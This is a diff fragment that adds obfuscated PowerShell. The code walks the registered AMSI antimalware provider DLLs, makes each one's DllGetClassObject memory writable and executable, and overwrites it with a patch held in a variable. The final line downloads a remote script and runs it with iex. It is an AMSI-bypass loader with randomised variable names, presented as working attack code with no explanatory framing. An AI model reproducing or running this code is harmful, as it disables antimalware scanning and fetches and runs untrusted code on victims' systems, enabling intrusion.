@@ -1,0 +1,19 @@
+foreach ($VqlmDLRJrkiEuGfCiaLHbTvtpQZBqSlDZ in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
+{
+    $iUOAZsHbKBTGRelRwFbjZQXBubSghdCcvrbhhaRw = 'HKLM:\Software\Classes\CLSID\' + $VqlmDLRJrkiEuGfCiaLHbTvtpQZBqSlDZ + '\InprocServer32'
+    $piOpAzBoYSrSpMUxOFhKgRkpNvgdxg = Get-ItemPropertyValue -Name '(Default)' $iUOAZsHbKBTGRelRwFbjZQXBubSghdCcvrbhhaRw -ErrorAction SilentlyContinue
+    if ($piOpAzBoYSrSpMUxOFhKgRkpNvgdxg)
+    {
+        $apGTYTyJNZwIHPEoldGOzHvcDbcUwGFxlKqyXgPp = Split-Path $piOpAzBoYSrSpMUxOFhKgRkpNvgdxg -leaf
+        $ORuvOnrCiNbGofReeNguCXwrKzqTzNhWZym = $apGTYTyJNZwIHPEoldGOzHvcDbcUwGFxlKqyXgPp -replace '"', ""
+        $DqJsWQqeGEqEScdhBYuQEgaipyOLaskiyXMxWhKb = $NHrfpnuQQKkhjEBfRTFrWghM.Invoke($ORuvOnrCiNbGofReeNguCXwrKzqTzNhWZym) 
+        if ($DqJsWQqeGEqEScdhBYuQEgaipyOLaskiyXMxWhKb -ne 0)
+        {
+            Write-host "[*] Provider found - " $apGTYTyJNZwIHPEoldGOzHvcDbcUwGFxlKqyXgPp
+            $hDCPkodSZyTRogywbDybqtaxyZvFddjGsNiTbpBa = $hqXIYzZYxOqTyPXpwIJlPFaFuSeyjn.Invoke($DqJsWQqeGEqEScdhBYuQEgaipyOLaskiyXMxWhKb, "DllGetClassObject")        
+            $jjtTnLPIWtlNZiEBsMZCWfvZwpNZqXwLWHiNS.Invoke($hDCPkodSZyTRogywbDybqtaxyZvFddjGsNiTbpBa, [uint32]$eXFmPTMKalibjIJMWDsFaWBJtZIwxjnKjV.Length, 0x40, [ref]$gTDyNSAtgyeVzNRKWtoz)
+            [System.Runtime.InteropServices.Marshal]::Copy($eXFmPTMKalibjIJMWDsFaWBJtZIwxjnKjV, 0, $hDCPkodSZyTRogywbDybqtaxyZvFddjGsNiTbpBa, $eXFmPTMKalibjIJMWDsFaWBJtZIwxjnKjV.Length)
+        }
+    }
+}
+$wbc.DownloadString("$prefixpath/Grilled.ps1.c6") | iex
